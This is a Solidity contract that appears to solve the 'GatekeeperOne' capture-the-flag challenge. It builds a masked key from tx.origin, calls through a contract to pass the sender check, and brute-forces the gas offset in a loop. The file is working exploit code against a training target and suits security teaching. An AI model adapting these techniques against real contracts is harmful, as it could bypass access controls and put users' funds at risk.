// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneAttacker {
    IGatekeeperOne public target;

    constructor(address _target) {
        target = IGatekeeperOne(_target);
    }

    function attack() external returns (bool) {
        // Gate 3: Construct the key based on tx.origin
        bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;

        // Gate 2: Brute force the gas offset
        // Gate 1: Contract call bypasses msg.sender == tx.origin
        for (uint256 i = 0; i < 8191; i++) {
            (bool success, ) = address(target).call{gas: i + (8191 * 3)}(
                abi.encodeWithSignature("enter(bytes8)", gateKey)
            );
            if (success) {
                return true;
            }
        }
        return false;
    }
}
